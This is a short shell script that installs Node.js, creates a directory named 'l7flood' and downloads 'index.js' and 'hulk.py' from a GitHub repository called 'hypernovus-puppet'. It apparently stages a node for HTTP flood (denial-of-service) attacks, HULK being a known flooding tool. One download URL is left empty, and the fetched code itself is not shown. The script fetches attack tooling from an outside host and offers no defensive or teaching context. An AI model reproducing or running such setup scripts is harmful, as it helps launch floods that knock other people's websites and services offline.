#!/bin/sh

JSURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js
PYURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py
RUNNERURL=

apt install npm
apt install nodejs

wget $RUNNERURL

mkdir l7flood
cd l7flood

npm install delay
npm install express

wget $JSURL
wget $PYURL



